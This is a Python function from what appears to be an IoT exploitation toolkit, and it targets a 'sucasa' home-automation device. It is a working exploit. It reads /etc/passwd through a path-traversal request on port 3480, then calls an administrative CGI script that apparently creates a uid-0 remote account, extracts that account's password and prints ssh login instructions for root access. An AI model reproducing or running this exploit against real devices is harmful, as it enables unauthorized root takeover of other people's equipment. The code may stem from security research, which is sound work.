def execute(self, ip):
    """
    "Sucasa"
        A idIOTic "execute" module that exploits the remote 'sucasa' device. It does
        everything in one go:
           1. Fetch the password file
           2. Fetches a root password from an administrative script.
           3. Displays the password to you allowing you to ssh into the device as root.

        Usage: 
            sucasa <ipaddress of target>

    """

     # Credit: Ben Reichert of Xipiter, LLC
    import urllib.request

    print("[+] grabbing /etc/passwd...\n")
    url = "http://"+str(ip)+":3480/data_request?id=file&parameters=../../etc/passwd"
    print(urllib.request.urlopen(url).read().decode("utf-8"))


    url = "http://"+str(ip)+"/cgi-bin/cmh/tech_ra.sh"
    password = str(urllib.request.urlopen(url).read().decode("utf-8").split("-")[1].split(" to the")[0])
    print("[+] adding remote user, uid=0,gid=0, password = %s" %password)

    print("[+] new /etc/passwd...\n")
    url = "http://"+str(ip)+":3480/data_request?id=file&parameters=../../etc/passwd"
    print(urllib.request.urlopen(url).read().decode("utf-8"))

    print("[+] please exit idIOTic, and enter 'ssh remote@%(a)s' and then enter the password %(b)s" % {'a':ip,'b':password})

